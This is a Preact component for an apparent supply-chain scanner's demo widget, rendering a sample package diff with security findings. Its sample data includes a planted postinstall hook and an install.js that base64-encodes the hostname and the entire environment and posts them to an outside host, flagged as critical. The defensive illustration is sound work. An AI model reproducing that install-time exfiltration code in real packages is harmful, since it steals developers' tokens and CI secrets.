import type { ComponentChildren } from "preact";
import { useSignal, useComputed, type Signal } from "@preact/signals";
import { Badge, type BadgeTone } from "../../components/Badge";
import { Card } from "../../components/Card";
import { cn } from "../../components/cn";
import { SeverityBar } from "../../components/SeverityBar";
import { MonoDetail, SectionLabel } from "../../components/Typography";

/* ------------------------------------------------------------------ *
 * Interactive review preview — a condensed scan report. The tree is  *
 * clickable; each file swaps in its own diff and pinned finding.     *
 * ------------------------------------------------------------------ */

type PreviewDiffLine = {
  tone: "added" | "removed" | "unchanged";
  before: number | null;
  after: number | null;
  text: string;
};

type PreviewFinding = {
  severity: "critical" | "medium";
  caption: string;
  body: ComponentChildren;
};

type PreviewFile = {
  path: string;
  status: "added" | "modified";
  lines: PreviewDiffLine[];
  finding?: PreviewFinding;
};

const PREVIEW_FILES = {
  "package.json": {
    path: "package.json",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 3, after: 3, text: '  "version": "4.3.0",' },
      { tone: "unchanged", before: 4, after: 4, text: '  "main": "lib/index.js",' },
      { tone: "unchanged", before: 5, after: 5, text: '  "scripts": {' },
      { tone: "unchanged", before: 6, after: 6, text: '    "build": "tsc -p .",' },
      {
        tone: "added",
        before: null,
        after: 7,
        text: '    "postinstall": "node lib/install.js",',
      },
      { tone: "unchanged", before: 7, after: 8, text: '    "test": "vitest"' },
      { tone: "unchanged", before: 8, after: 9, text: "  }," },
    ],
    finding: {
      severity: "critical",
      caption: "lifecycle script added · line 7",
      body: (
        <>
          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> now executes during
          every <code class="font-mono text-[12px] text-ink-muted">npm install</code>, invoking{" "}
          <code class="font-mono text-[12px] text-ink-muted">lib/install.js</code>, a file new in
          this release. Select it in the tree to see why this release is blocked.
        </>
      ),
    },
  },
  "lib/install.js": {
    path: "lib/install.js",
    status: "added",
    lines: [
      { tone: "added", before: null, after: 1, text: 'const os = require("node:os");' },
      { tone: "added", before: null, after: 2, text: "const payload = Buffer.from(" },
      {
        tone: "added",
        before: null,
        after: 3,
        text: "  JSON.stringify({ host: os.hostname(), env: process.env }),",
      },
      { tone: "added", before: null, after: 4, text: ').toString("base64");' },
      {
        tone: "added",
        before: null,
        after: 5,
        text: 'fetch("https://cdn-metrics.dev/i", { method: "POST", body: payload });',
      },
    ],
    finding: {
      severity: "critical",
      caption: "environment sent to network sink · line 5",
      body: (
        <>
          The full environment — npm tokens, CI secrets — is serialized and posted to{" "}
          <code class="font-mono text-[12px] text-ink-muted">cdn-metrics.dev</code>, a host this
          package has never contacted. Combined with the new{" "}
          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> hook, it runs on
          every install.
        </>
      ),
    },
  },
  "lib/api.js": {
    path: "lib/api.js",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 21, after: 21, text: "export async function getUser(id) {" },
      {
        tone: "unchanged",
        before: 22,
        after: 22,
        text: "  const res = await fetch(`${API_BASE}/users/${id}`);",
      },
      { tone: "added", before: null, after: 23, text: "  await reportUsage(id);" },
      { tone: "unchanged", before: 23, after: 24, text: "  return res.json();" },
      { tone: "unchanged", before: 24, after: 25, text: "}" },
      { tone: "added", before: null, after: 26, text: "" },
      { tone: "added", before: null, after: 27, text: "async function reportUsage(id) {" },
      {
        tone: "added",
        before: null,
        after: 28,
        text: "  await fetch(`https://api.acme-usage.dev/v1/e?u=${id}`);",
      },
      { tone: "added", before: null, after: 29, text: "}" },
    ],
    finding: {
      severity: "medium",
      caption: "new request target · line 28",
      body: (
        <>
          <code class="font-mono text-[12px] text-ink-muted">api.acme-usage.dev</code> is an
          outbound host the previous version never contacted. Not malicious on its face — the kind
          of change worth thirty seconds before it reaches every install.
        </>
      ),
    },
  },
  "lib/index.js": {
    path: "lib/index.js",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 1, after: 1, text: 'export { getUser } from "./api.js";' },
      { tone: "removed", before: 2, after: null, text: 'export const VERSION = "4.2.0";' },
      { tone: "added", before: null, after: 2, text: 'export const VERSION = "4.3.0";' },
    ],
  },
} satisfies Record<string, PreviewFile>;

type PreviewFileKey = keyof typeof PREVIEW_FILES;

export function ScanPreview() {
  const selected = useSignal<PreviewFileKey>("package.json");

  return (
    <section class="flex flex-col gap-3" aria-label="Sample review">
      <SectionLabel as="h2">What a review looks like</SectionLabel>
      <p class="m-0 text-[13px] text-ink-muted leading-[1.55]">
        A condensed report. Select a file in the release tree to walk the diff.
      </p>
      <Card padding="none" class="overflow-hidden">
        <header class="px-5 pt-5 pb-4 border-b border-border flex flex-col gap-3">
          <div class="flex flex-wrap items-baseline justify-between gap-x-4 gap-y-1">
            <h3 class="m-0 text-lg font-semibold tracking-[-0.01em]">@acme/cli</h3>
            <span class="font-mono text-[11px] text-ink-subtle">scan_01HXY5K9PNQE3</span>
          </div>
          <MonoDetail
            parts={[
              <span key="v">4.2.0 → 4.3.0</span>,
              <span key="files">17 files</span>,
              <span key="changed">4 changed</span>,
              <span key="status">complete</span>,
            ]}
          />
          <div class="flex flex-wrap items-center gap-x-3 gap-y-2">
            <p class="m-0 text-lg font-semibold tracking-[-0.01em] text-danger-text">
              Manual review required
            </p>
            <Badge tone="critical">release critical</Badge>
          </div>
          <SeverityBar counts={{ critical: 2, medium: 1 }} class="max-w-[420px]" />
        </header>

        <div class="grid grid-cols-1 md:grid-cols-[220px_minmax(0,1fr)] divide-y md:divide-y-0 md:divide-x divide-border">
          <aside class="p-4 flex flex-col gap-2 bg-bg/40">
            <span class="font-mono text-[11px] uppercase tracking-[0.1em] text-ink-subtle">
              Release tree
            </span>
            <ul class="list-none p-0 m-0 flex flex-col gap-0.5 font-mono text-[12px]">
              <TreeRow depth={0} folder open name="lib" tone="mixed" />
              <TreeFileRow
                depth={1}
                fileKey="lib/install.js"
                name="install.js"
                tone="added"
                findingTone="critical"
                findings={1}
                selected={selected}
              />
              <TreeFileRow
                depth={1}
                fileKey="lib/api.js"
                name="api.js"
                tone="modified"
                findingTone="medium"
                findings={1}
                selected={selected}
              />
              <TreeFileRow
                depth={1}
                fileKey="lib/index.js"
                name="index.js"
                tone="modified"
                selected={selected}
              />
              <TreeFileRow
                depth={0}
                fileKey="package.json"
                name="package.json"
                tone="modified"
                findingTone="critical"
                findings={1}
                selected={selected}
              />
              <TreeRow depth={0} name="README.md" tone="unchanged" />
              <TreeRow depth={0} name="LICENSE" tone="unchanged" />
            </ul>
          </aside>

          <PreviewPane selected={selected} />
        </div>
      </Card>
    </section>
  );
}

// The whole pane swaps with the selection, so the `.value` read here is the
// subscription boundary on purpose: only this component rerenders.
function PreviewPane({ selected }: { selected: Signal<PreviewFileKey> }) {
  const file: PreviewFile = PREVIEW_FILES[selected.value];
  return (
    <div class="flex flex-col min-w-0">
      <div class="px-4 py-2 bg-surface-2 flex flex-wrap items-center justify-between gap-2 border-b border-border">
        <div class="flex items-center gap-2 min-w-0">
          <Badge tone={file.status}>{file.status}</Badge>
          <code class="font-mono text-xs text-ink-muted truncate">{file.path}</code>
        </div>
        <span class="font-mono text-[11px] uppercase tracking-[0.1em] text-ink-subtle">
          4.2.0 → 4.3.0
        </span>
      </div>

      <div class="overflow-x-auto">
        <table class="w-full border-collapse font-mono text-[12px] leading-[1.55]">
          <tbody>
            {file.lines.map((line, index) => (
              <DiffLine key={index} {...line} />
            ))}
          </tbody>
        </table>
      </div>

      {file.finding ? (
        <FindingAnnotation severity={file.finding.severity} caption={file.finding.caption}>
          {file.finding.body}
        </FindingAnnotation>
      ) : (
        <p class="m-0 border-t border-border px-4 py-3 text-[13px] leading-[1.55] text-ink-muted">
          No findings — most of a release reads like this file.
        </p>
      )}
    </div>
  );
}

const treeToneClass: Record<string, string> = {
  added: "text-ok-text",
  removed: "text-danger-text",
  modified: "text-warn-text",
  mixed: "text-accent",
  unchanged: "text-ink-muted",
};

function TreeRow({
  depth,
  name,
  tone,
  folder,
  open,
}: {
  depth: number;
  name: string;
  tone: "added" | "removed" | "modified" | "unchanged" | "mixed";
  folder?: boolean;
  open?: boolean;
}) {
  return (
    <li class={cn("flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded", treeToneClass[tone])}>
      <TreeRowIndent depth={depth} folder={folder} open={open} />
      <span class="flex-1 truncate">
        {name}
        {folder ? "/" : ""}
      </span>
    </li>
  );
}

function TreeFileRow({
  depth,
  fileKey,
  name,
  tone,
  findings,
  findingTone,
  selected,
}: {
  depth: number;
  fileKey: PreviewFileKey;
  name: string;
  tone: "added" | "modified";
  findings?: number;
  findingTone?: BadgeTone;
  selected: Signal<PreviewFileKey>;
}) {
  const rowClass = useComputed(() =>
    cn(
      "w-full text-left font-mono text-[12px] flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded cursor-pointer transition-colors duration-150 ease-out",
      selected.value === fileKey
        ? "bg-surface-2 text-ink"
        : cn(treeToneClass[tone], "hover:bg-surface-2/60"),
    ),
  );
  const current = useComputed(() => (selected.value === fileKey ? "true" : undefined));
  return (
    <li class="flex">
      <button
        type="button"
        class={rowClass}
        aria-current={current}
        onClick={() => {
          selected.value = fileKey;
        }}
      >
        <TreeRowIndent depth={depth} />
        <span class="flex-1 truncate">{name}</span>
        {findings ? (
          <span
            class="shrink-0"
            title={`${findings} ${findings === 1 ? "finding" : "findings"}`}
            aria-label={`${findings} ${findings === 1 ? "finding" : "findings"}`}
          >
            <Badge tone={findingTone ?? "neutral"}>{findings}</Badge>
          </span>
        ) : null}
      </button>
    </li>
  );
}

function TreeRowIndent({
  depth,
  folder,
  open,
}: {
  depth: number;
  folder?: boolean;
  open?: boolean;
}) {
  return (
    <>
      {Array.from({ length: depth }, (_, index) => (
        <span key={index} class="w-4 shrink-0" aria-hidden />
      ))}
      {folder ? (
        <span aria-hidden class="text-[10px] text-ink-subtle">
          {open ? "▾" : "▸"}
        </span>
      ) : (
        <span class="w-[10px] shrink-0" aria-hidden />
      )}
    </>
  );
}

function DiffLine({ tone, before, after, text }: PreviewDiffLine) {
  const bg = tone === "added" ? "bg-ok-soft" : tone === "removed" ? "bg-danger-soft" : "";
  const sign = tone === "added" ? "+" : tone === "removed" ? "-" : " ";
  return (
    <tr class={bg}>
      <td class="px-2 py-[2px] text-ink-subtle select-none w-[44px] text-right border-r border-border align-top">
        {before ?? ""}
      </td>
      <td class="px-2 py-[2px] text-ink-subtle select-none w-[44px] text-right border-r border-border align-top">
        {after ?? ""}
      </td>
      <td class="px-2 py-[2px] select-none w-[20px] text-ink-subtle align-top">{sign}</td>
      <td class="px-2 py-[2px] whitespace-pre-wrap break-words align-top">{text}</td>
    </tr>
  );
}

function FindingAnnotation({
  severity,
  caption,
  children,
}: {
  severity: "critical" | "medium";
  caption: string;
  children: ComponentChildren;
}) {
  const toneClass =
    severity === "critical" ? "bg-danger-soft/60 border-l-danger" : "bg-warn-soft/60 border-l-warn";
  return (
    <div class={cn("border-t border-border border-l-2 px-4 py-3 flex flex-col gap-1.5", toneClass)}>
      <div class="flex items-center gap-2 flex-wrap">
        <Badge tone={severity}>{severity}</Badge>
        <span class="font-mono text-[11px] uppercase tracking-[0.1em] text-ink-subtle">
          {caption}
        </span>
      </div>
      <p class="m-0 text-[13px] leading-[1.55] text-ink">{children}</p>
    </div>
  );
}
